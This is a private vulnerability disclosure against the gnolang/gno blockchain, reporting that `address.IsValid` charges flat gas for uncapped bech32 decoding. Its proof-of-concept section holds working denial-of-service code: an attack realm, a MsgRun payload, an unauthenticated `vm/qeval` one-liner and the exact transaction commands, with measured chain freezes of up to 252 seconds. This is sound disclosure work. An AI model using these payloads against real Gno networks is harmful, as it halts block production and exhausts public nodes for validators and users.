## gnolang/gno
Private audit · Target: [gnolang/gno](https://github.com/gnolang/gno)

Gno is a smart-contract platform interpreted in Go (Gnolang). This finding is an unmetered
computation bug in the `address.IsValid` uverse native: it runs a full, uncapped bech32 decode of
an attacker-supplied string, returns `false` on failure instead of panicking (so realm code can
loop it), and is charged a flat 2205 gas regardless of input length. Measured on a locally built
chain: 5474 gas per call against ~105 ms of validator CPU per 8 MB call; a single ~4.9 M-gas
transaction froze block production and RPC for 252 seconds and then committed as valid, and at the
default 3 billion gas block limit one transaction extrapolates to about 5 days of continuous
freeze for a few ugnot. The identical decode work is priced at ~14.8 gas/byte by the calibrated
`chain.packageAddress` native — an underpricing of roughly 56,000×. Also reachable with zero cost
and no identity through the free, unauthenticated `vm/qeval` RPC endpoint, and via `MsgRun`
ephemeral code with no deployment at all.

- **Audited ref:** master @ `0549199e35fa13f6ea90f94b0afedad5fa018b38`
- **Weakness:** CWE-400 (uncontrolled resource consumption) / CWE-770 — flat-priced native with unbounded input
- **Patched:** none known at time of report; the repo's own `gnovm/adr/native_input_bounds.md` states the bounding rule but does not list `IsValid`
- **Disclosure:** privately reported to the Gno security channel
- **PoC:** attack realm [`poc/gno-gasbomb-realm.gno`](./poc/gno-gasbomb-realm.gno), no-deployment MsgRun payload [`poc/gno-msgrun-bomb.gno`](./poc/gno-msgrun-bomb.gno), decoder microbenchmark [`poc/gno-bech32-decode-bench_test.go`](./poc/gno-bech32-decode-bench_test.go), one-command end-to-end reproduction [`poc/gno-run-regtest.sh`](./poc/gno-run-regtest.sh)

**Severity — researcher analysis.** Critical on default and permissionless configurations
(`code_submission_policy` defaults to permissionless, `run_submitters` to empty): one cheap,
valid transaction freezes the whole network's block production — 16/21/102/252-second stalls
measured, ~5 days extrapolated. On mainnet `gnoland-1` and `onyx` today the deploy and MsgRun
paths are policy-gated and the directly open vector is unauthenticated `vm/qeval` RPC exhaustion —
High. The gating is a launch posture, not a fix; the defect ships in every build.

---

# Unmetered bech32 decoding in the address.IsValid native allows a single cheap transaction to halt block production

## 1. Title

Unmetered native computation in the `address.IsValid` builtin. Unbounded bech32 decode work is charged a flat 2205 gas, which allows any realm or even an unauthenticated query caller to convert a few million gas into hours or days of validator CPU, freezing block production for the duration.

## 2. Description

### Brief / Intro

The `address.IsValid` builtin runs a complete bech32 decode over the string it is given, with no limit on the length of that string, but the VM charges a fixed 2205 gas for the call no matter how long the string is. The call returns false on bad input instead of panicking, so realm code can simply loop it. On a locally built single validator chain with default consensus parameters one transaction of about 5 million gas froze all block production and all RPC service for 4 minutes and 12 seconds, then committed as a valid transaction. The same arithmetic scales to multiple days of continuous freeze at the default 3 billion gas block limit, from a transaction that costs a few ugnot. The same builtin is reachable through the free and unauthenticated `vm/qeval` RPC endpoint, which turns the defect into a zero cost, no identity, repeatable CPU exhaustion attack against any public node.

### Vulnerability Details

The attack surface is a uverse native, meaning a builtin method defined directly in the VM rather than in the on chain stdlib tree. The relevant code is at `gnovm/pkg/gnolang/uverse.go` lines 1554 to 1570.

```go
defNativeMethod("address", "IsValid",
	nil, // params
	Flds( // results
		"", "bool",
	),
	func(m *Machine) {
		arg0 := m.LastBlock().GetParams1(nil)
		b32addr := arg0.TV.GetString()
		addr, err := crypto.AddressFromBech32(b32addr)
		if err != nil {
			m.PushValue(typedBool(false))
			return
		}
		_ = addr
		m.PushValue(typedBool(len(addr) == 20))
	},
)
```

Three properties of this function matter.

First, the input length is never checked. The string flows through `crypto.AddressFromBech32` at `tm2/pkg/crypto/bech32.go` line 19, then `GetFromBech32` at line 47, then `DecodeAndConvert` at `tm2/pkg/bech32/bech32.go` lines 24 to 33, which calls `bech32.DecodeNoLimit` from btcutils v1.2.0. As the name says, that decoder has no length limit. Every function in the chain accepts the full string and the decoder performs multiple linear passes over it, character set validation, separator search, data decode and checksum verification, before failing on a string like `"g1"` followed by sixty megabytes of `q`.

Second, the call returns false on failure rather than panicking. This is the difference between a one shot annoyance and a loop. A native that panics aborts the transaction after a single call. IsValid returns a clean false, so a loop of one million calls executes one million full decodes inside one transaction.

Third, the gas charge is a flat constant that does not depend on the input. The gas logic in `gnovm/pkg/gnolang/native_gas.go` lines 248 to 264 charges stdlib natives from a calibration table, and forces a panic for any stdlib native missing from that table, but uverse natives have an empty `NativePkg` and fall through to this branch.

```go
if fv.NativePkg == "" {
	m.incrCPU(OpCPUCallNativeBody)
	return nil
}
```

`OpCPUCallNativeBody` is defined at `gnovm/pkg/gnolang/machine.go` line 1515.

```go
OpCPUCallNativeBody = 2205 // XXX arbitrary, not properly benchmarked
```

The comment above the fallback in native_gas.go also says, quote, TODO extend the calibration table to cover uverse natives too. So the class of the problem is acknowledged in the code, but the security consequence is not stated anywhere, and `IsValid` in particular is not mentioned.

The project already knows what this work should cost, because the identical bech32 decode done by a calibrated chain native, `chain.packageAddress`, is priced with a per byte slope of 15201 gas per 1024 bytes at `gnovm/stdlibs/native_gas.go` line 123, which is about 14.8 gas per byte. An 8 megabyte decode priced at that rate would cost about 124 million gas. Through `IsValid` it costs 2205. That is an underpricing of roughly 56000 times for the same work, measured against the project's own calibration.

There is an internal inconsistency that shows the fix pattern already exists in the codebase. Another uverse native, `realm.Sub`, cannot use the calibration table either, so it self charges base plus slope times length inside its own body, with a comment at `gnovm/pkg/gnolang/uverse.go` lines 1734 to 1743 explaining exactly that. `IsValid` has no self charge and no length cap. That asymmetry is the bug.

The remaining pieces of the arithmetic.

The attacker string does not need to come from the transaction. A realm builds it once with string doubling concatenation, which costs about 0.3 gas per byte, so a 64 megabyte string costs roughly 20 million gas to build. Allocation is bounded by `maxAllocTx` of 500 megabytes at `gno.land/pkg/sdk/vm/keeper.go` line 50, which does not bound the attack because 8 megabytes is already optimal.

The default block gas limit is 3 billion. It is set in `gno.land/cmd/gnoland/start.go` lines 425 to 433 for the default chain, and the protocol maximum `MaxBlockMaxGas` is 3 billion at `tm2/pkg/bft/types/params.go` line 52.

Delivery of a transaction is synchronous in the consensus goroutine. There is no wall clock timeout that preempts a long DeliverTx. Every validator that applies the block executes the transaction to completion before voting. This is why a compute bomb is a liveness kill and not just a slow transaction.

### Impact Details

All numbers below were measured on a locally built chain and are reproduced in the PoC section with raw outputs.

Measured on chain, per call cost of `IsValid` in the middle of a loop is 5474 gas, independent of string length. Measured validator CPU per call is linear in length, about 100 to 200 milliseconds per megabyte through the full VM path. A `Bomb(1MB, 100)` transaction of 2080647 gas froze block production for 16 seconds, and a repeat run froze it for 21 seconds, both committing as valid transactions. A `Bomb(8MB, 300)` transaction of about 4.9 million gas froze block production for 252 seconds. During that window the RPC endpoint stopped answering entirely, 29 consecutive status polls timed out, then the transaction committed as valid and the chain resumed its normal 5 second block cadence.

Extrapolation using only measured constants. At the default 3 billion gas a single transaction fits about 548000 calls. At the measured 105 milliseconds per megabyte call from the 8 megabyte run, one transaction with an 8 megabyte string freezes the chain for about 5 days. With a 64 megabyte string, which allocation limits allow, the freeze is over a month. Even on a chain that lowers the block gas limit to 100 million, the freeze is about 4 hours per transaction. The attacker pays a gas fee on the order of a few ugnot, needs nothing beyond a funded account, and the transaction is legitimate and valid, so there is no automatic recovery. The only remediation is a coordinated halt or a skip upgrade by operators.

There are four delivery vectors and they differ in what they require.

On any chain with default parameters, `code_submission_policy` defaults to permissionless at `gno.land/pkg/sdk/vm/params.go` line 43 and `run_submitters` defaults to empty, which means anyone may send MsgRun per the comment at `params.go` lines 131 to 132. So the halt is available through deploying a realm, or through MsgRun ephemeral code with no deployment at all. Both were tested. MsgRun froze the test chain for 102 seconds with zero deployed code.

On mainnet gnoland-1 and the onyx testnet, `misc/deployments/mainnet.gno.land/gen-genesis.sh` line 325 sets `CODE_SUBMISSION_POLICY=inert` and lines 370 to 375 restrict run submitters to GovDAO tier 1, with the same shape in `onyx.gno.land/gen-genesis.sh` lines 165 and 194 to 199. On those two chains the deploy and MsgRun paths are permission gated, and the impact there is the remaining vector. The `vm/qeval` endpoint is unauthenticated and free, it evaluates an arbitrary expression including function literals in the scope of any deployed package, and its query budget is 3 billion gas with a 1.5 gigabyte allocation cap at `gno.land/pkg/sdk/vm/keeper.go` lines 51 and 52. A single unauthenticated qeval request with an inline function literal held 19.3 seconds of node CPU in our test at trivial size, and scales to the full query budget. It does not stop consensus, but it exhausts public RPC capacity for wallets, explorers and frontends, at zero cost and with no identity. Also on mainnet, the deployed `r/sys/users` realm passes caller input to `IsValid` at `examples/gno.land/r/sys/users/users.gno` line 39, which gives a single shot per call variant to any funded account.

Severity summary. On default and permissionless configurations this is a network freezing impact from one cheap transaction, Critical by any standard liveness rubric. On mainnet and onyx today the consensus halt path is policy gated and the direct impact is the unauthenticated RPC exhaustion, High. The gating is a launch posture and not a fix, and the defect itself is present in every build.

This impact class is squarely within what the project treats as security work. Three shipped ADRs fix this exact class, `gnovm/adr/pr6171_modexp_work_metric.md` describes the prior flat gas modexp bug as a consensus halt vector, `gnovm/adr/pr6164_qeval_bignum_dos.md` documents the free unauthenticated qeval threat model, and `gnovm/adr/native_input_bounds.md` sets the rule that every variable length native input must be bounded or metered, and lists three known unfixed exceptions, of which `chain.pubKeyAddress` is the closest sibling of this finding and is noted there as reported separately. `address.IsValid` is not in that list and is not acknowledged anywhere else in the repository, in comments, tests, issues or ADRs, and it is not fixed upstream at the time of writing.

### References

All code references are at commit 0549199e35fa13f6ea90f94b0afedad5fa018b38 on master.

- IsValid native, gnovm/pkg/gnolang/uverse.go lines 1554 to 1570, https://github.com/gnolang/gno/blob/0549199e35fa13f6ea90f94b0afedad5fa018b38/gnovm/pkg/gnolang/uverse.go#L1554-L1570
- Flat gas fallback for uverse natives and the calibration TODO, gnovm/pkg/gnolang/native_gas.go lines 248 to 264, https://github.com/gnolang/gno/blob/0549199e35fa13f6ea90f94b0afedad5fa018b38/gnovm/pkg/gnolang/native_gas.go#L248-L264
- The 2205 constant marked not properly benchmarked, gnovm/pkg/gnolang/machine.go line 1515, https://github.com/gnolang/gno/blob/0549199e35fa13f6ea90f94b0afedad5fa018b38/gnovm/pkg/gnolang/machine.go#L1515
- Uncapped decode path, tm2/pkg/bech32/bech32.go lines 24 to 33, https://github.com/gnolang/gno/blob/0549199e35fa13f6ea90f94b0afedad5fa018b38/tm2/pkg/bech32/bech32.go#L24-L33
- Calibrated price of identical bech32 work, gnovm/stdlibs/native_gas.go line 123, https://github.com/gnolang/gno/blob/0549199e35fa13f6ea90f94b0afedad5fa018b38/gnovm/stdlibs/native_gas.go#L123
- The self charging pattern that IsValid lacks, gnovm/pkg/gnolang/uverse.go lines 1734 to 1743
- Allocation and query limits, gno.land/pkg/sdk/vm/keeper.go lines 50 to 52
- Default block gas, gno.land/cmd/gnoland/start.go lines 425 to 433, and tm2/pkg/bft/types/params.go line 52
- Policy defaults, gno.land/pkg/sdk/vm/params.go lines 43 and 126 to 132
- Mainnet and onyx gating, misc/deployments/mainnet.gno.land/gen-genesis.sh lines 325 and 370 to 375, misc/deployments/onyx.gno.land/gen-genesis.sh lines 165 and 194 to 199
- ADR on native input bounds including the known unfixed exceptions, gnovm/adr/native_input_bounds.md
- ADR on the free qeval DoS fix, gnovm/adr/pr6164_qeval_bignum_dos.md
- ADR on the modexp consensus halt fix, gnovm/adr/pr6171_modexp_work_metric.md

## 3. Proof of Concept

Everything below ran on a local single validator chain built from source. Nothing was broadcast to any public testnet or mainnet. Stall parameters were deliberately kept small so each demonstration stays in the range of seconds to a few minutes, and every freeze duration quoted below is read from committed block timestamps, not from the client.

### 3.1 Build

Machine, darwin arm64, go1.26.4. Repository at commit 0549199e35fa13f6ea90f94b0afedad5fa018b38. A forced full rebuild with cache bypassed confirms the whole dependency tree compiles from source.

```
$ go build -a -o ./bin/gnoland ./gno.land/cmd/gnoland   # 31.8s
$ go build -a -o ./bin/gnokey ./gno.land/cmd/gnokey     # 13.3s
$ go build -a -o ./bin/gno     ./gnovm/cmd/gno          # 10.1s
$ go build ./...                                         # 249 packages, ok
$ ./bin/gnoland version
gnoland version: develop
```

### 3.2 Decoder cost microbenchmark

This isolates the Go side cost of the uncapped decode on invalid bech32 strings of the exact shape the attack uses. Linear in length, about 16 nanoseconds per byte.

```go
package gnosec

import (
	"strings"
	"testing"
	"time"

	"github.com/btcsuite/btcd/btcutil/bech32"
)

func benchSize(b *testing.B, n int) {
	s := "g1" + strings.Repeat("q", n-2)
	b.ResetTimer()
	t0 := time.Now()
	for i := 0; i < b.N; i++ {
		_, _, err := bech32.DecodeNoLimit(s)
		if err == nil {
			b.Fatal("expected error")
		}
	}
	d := time.Since(t0)
	b.ReportMetric(float64(d.Nanoseconds())/float64(b.N)/float64(n), "ns/byte")
}

func BenchmarkDecode4KB(b *testing.B)  { benchSize(b, 4<<10) }
func BenchmarkDecode1MB(b *testing.B)  { benchSize(b, 1<<20) }
func BenchmarkDecode8MB(b *testing.B)  { benchSize(b, 8<<20) }
func BenchmarkDecode64MB(b *testing.B) { benchSize(b, 64<<20) }
```

```
BenchmarkDecode4KB    5	    80208 ns/op   19.56 ns/byte
BenchmarkDecode1MB    5	 16914433 ns/op   16.13 ns/byte    16.8 ms/call
BenchmarkDecode8MB    5	136161700 ns/op   16.23 ns/byte   136.0 ms/call
BenchmarkDecode64MB   5       1086007583 ns/op   16.18 ns/byte  1086 ms/call
```

### 3.3 Attack realm

Deployed as gno.land/r/sec/gasbomb. The `Bomb` variant takes the crossing receiver so it is callable through MsgCall, `BombQ` is non crossing for qeval, `Honest` is the control loop of identical shape burning only metered interpreted arithmetic.

```go
package gasbomb

// build returns "g1" followed by 'q' characters up to size bytes total.
// Valid bech32 charset, guaranteed invalid checksum, so the decoder walks
// the entire string before failing.
func build(size int) string {
	s := "g1qqqqqqqqqqqqqqqqqqqqqqqqqqqqqq" // 32 bytes
	for len(s) < size {
		if len(s)*2 <= size {
			s = s + s
		} else {
			s = s + s[:size-len(s)]
		}
	}
	return s
}

func Bomb(cur realm, size int, iters int) int {
	s := build(size)
	n := 0
	for i := 0; i < iters; i++ {
		a := address(s)
		if a.IsValid() {
			panic("string unexpectedly valid")
		}
		n++
	}
	return n
}

func BombQ(size int, iters int) int {
	s := build(size)
	n := 0
	for i := 0; i < iters; i++ {
		a := address(s)
		if a.IsValid() {
			panic("string unexpectedly valid")
		}
		n++
	}
	return n
}

func Honest(cur realm, iters int) int {
	n := 0
	x := 1
	for i := 0; i < iters; i++ {
		x = (x*1103515245 + 12345) % 2147483647
		n++
	}
	return n
}
```

Off chain sanity check first, confirming the loop runs to completion and IsValid returns false without panicking.

```
$ GNOROOT=$REPO ./bin/gno test ./...
ok  	.	0.84s
```

### 3.4 Chain setup

Fresh chain, chainid regtest, default consensus parameters, all example packages deployed at genesis, ports rebound locally to 46656 and 46657.

```
$ printf '\n\n' | ./bin/gnokey -home ./keyhome -insecure-password-stdin add attacker
* attacker (local) - addr: g1h8azfa9xnk6fp9hsqdrlfmnuw3m6mk5eh74pf8
$ echo "g1h8azfa9xnk6fp9hsqdrlfmnuw3m6mk5eh74pf8=100000000000000ugnot" > balances.txt
$ ./bin/gnoland start -lazy -data-dir ./nodedata -chainid regtest \
    -genesis-balances-file balances.txt -gnoroot-dir $REPO -log-level info
# wait for config and genesis, then rebind laddr to 127.0.0.1:46656 and 127.0.0.1:46657,
# remove the db, and restart with -skip-failing-genesis-txs -skip-genesis-sig-verification
```

The chain comes up producing one block every 5 seconds. That baseline cadence is recorded before any attack.

```
12:46:39 height=7
12:46:44 height=8
12:46:49 height=9
12:46:54 height=10
12:46:59 height=11
12:47:04 height=12
```

Deploy the realm.

```
$ printf '\n' | ./bin/gnokey -home ./keyhome -insecure-password-stdin maketx addpkg attacker \
    -pkgpath gno.land/r/sec/gasbomb -pkgdir ./gasbomb -gas-fee 1000001ugnot \
    -gas-wanted 100000000 -broadcast=true -simulate skip -chainid regtest \
    -remote 127.0.0.1:46657
GAS USED:   5969979
HEIGHT:     7
PKGPATH:    gno.land/r/sec/gasbomb
```

### 3.5 Gas calibration

Gas per call is independent of string length, which is the core defect. Run with 2 iterations, then 2000, same 4KB string.

```
Bomb(4096, 2)    gas_used=1118559  height=18  ret='(2 int)'
Bomb(4096, 2000) gas_used=12055641 height=19  ret='(2000 int)'
```

Per call gas equals 12055641 minus 1118559 divided by 1998, which is 5474 gas per IsValid call.

Build cost for the string, one iteration at two sizes.

```
Bomb(1048576, 1) gas_used=1538794  height=20  ret='(1 int)'
Bomb(8388608, 1)  gas_used=3221119  height=21  ret='(1 int)'
```

The 8MB build adds about 2.1 million gas over the 4KB base, roughly 0.25 gas per byte, paid once.

The honest control, same loop shape, pure interpreted arithmetic.

```
Honest(2000)     gas_used=4546490  height=22  ret='(2000 int)'
```

### 3.6 Attack A, small freeze

```
$ printf '\n' | ./bin/gnokey -home ./keyhome -insecure-password-stdin maketx call attacker \
    -pkgpath gno.land/r/sec/gasbomb -func Bomb -args 1048576 -args 100 \
    -gas-fee 1000001ugnot -gas-wanted 100000000 -broadcast=true -simulate skip \
    -chainid regtest -remote 127.0.0.1:46657
```

The client times out on its own 10 second HTTP deadline while the node is still executing, which is expected. The evidence is in the committed block timeline, extracted from node.log.

```
12:48:35 h30 valid=0
>>> STALL 16s before 12:48:51 h31 valid=1
>>> STALL 21s before 12:49:24 h35 valid=1
```

Two independent executions of Bomb(1MB, 100), each freezing block production for 16 and then 21 seconds against a 5 second baseline, each committing as a valid transaction. On an earlier identical chain the same call completed inside the client window and reported gas used of 2080647, consistent with the calibration above.

### 3.7 Attack B, multi minute halt

Bomb(8MB, 300), launched in the background while block height is polled every 5 seconds.

```
12:50:23 height=45
12:50:29 height=45
12:50:36 height=46
12:50:41 height=UNREACHABLE
   ... 29 consecutive unreachable polls ...
12:54:35 height=UNREACHABLE
12:54:43 height=48
12:54:48 height=49
```

The committed block record for the same window.

```
>>> STALL 252s before 12:54:43 h47 valid=1 (prev 12:50:31 h46 valid=0)
```

Block production stopped for 4 minutes and 12 seconds, the RPC endpoint was unreachable for the whole execution window, then the transaction committed as valid at height 47 and the chain resumed its 5 second cadence. Calibrated gas for this transaction is about 4.9 million, base 1.1M plus 2.1M build plus 300 calls at 5474.

### 3.8 MsgRun, no deployment at all

The same bomb as an ephemeral run package, no realm deployed, no namespace, no CLA, no deposit.

```go
package main

func main() {
	s := "g1qqqqqqqqqqqqqqqqqqqqqqqqqqqqqq"
	for i := 0; i < 18; i++ { // 32 << 18 = 8 MiB
		s = s + s
	}
	n := 0
	for i := 0; i < 100; i++ {
		a := address(s)
		if a.IsValid() {
			panic("unexpectedly valid")
		}
		n++
	}
	_ = n
}
```

```
$ printf '\n' | ./bin/gnokey -home ./keyhome -insecure-password-stdin maketx run attacker \
    ./run.gno -gas-fee 1000001ugnot -gas-wanted 100000000 -broadcast=true \
    -simulate skip -chainid regtest -remote 127.0.0.1:46657
```

```
>>> STALL 102s before 13:20:52 h178 valid=1 (prev 13:19:10 h177 valid=0)
```

A 102 second freeze of block production from a transaction that deploys nothing.

### 3.9 Free unauthenticated qeval

No key, no fee, no signature, no deployment. An inline function literal evaluated in the scope of a genesis deployed realm.

```
$ ./bin/gnokey query "vm/qeval" --data 'gno.land/r/demo/counter.func() int { \
    s := "g1qqqqqqqqqqqqqqqqqqqqqqqqqqqqqq"; for i:=0;i<18;i++ { s = s+s }; \
    n := 0; for i:=0;i<30;i++ { a := address(s); if !a.IsValid() { n++ } }; \
    return n }()' -remote 127.0.0.1:46657

height: 0
data: (30 int)
```

Wall time 19.3 seconds for one request at trivial size, against a query gas budget of 3 billion. Block production continued during the query because queries run outside the consensus goroutine, which is why this variant is RPC exhaustion rather than a chain halt. On a separate run of the larger BombQ variant through qeval the client abandoned the request at its 60 second deadline while the node kept computing.

### 3.10 Extrapolation

Using only the measured constants, 5474 gas per call and 105 milliseconds per megabyte call taken from the 8MB run.

| Transaction gas | String | Calls | Freeze |
|---|---|---|---|
| 100 million | 8 MB | 18270 | about 4 hours |
| 3 billion | 8 MB | 548000 | about 5 days |
| 3 billion | 64 MB | 545000 | over a month |

The 500MB per transaction allocation cap at keeper.go line 50 bounds the string size, not the attack, since 8MB is already optimal. There is no wall clock preemption of DeliverTx, so the freeze runs to completion or until operators intervene.

### 3.11 Reproduction bundle

A one command script that rebuilds from source, bootstraps the chain, deploys the realm, runs the calibration, the attacks and the verdict extraction is included as run-regtest.sh, alongside the raw node log, the height poll captures, the transaction outputs, the calibration sheet, the benchmark and the attack sources. End to end runtime is about 20 minutes.
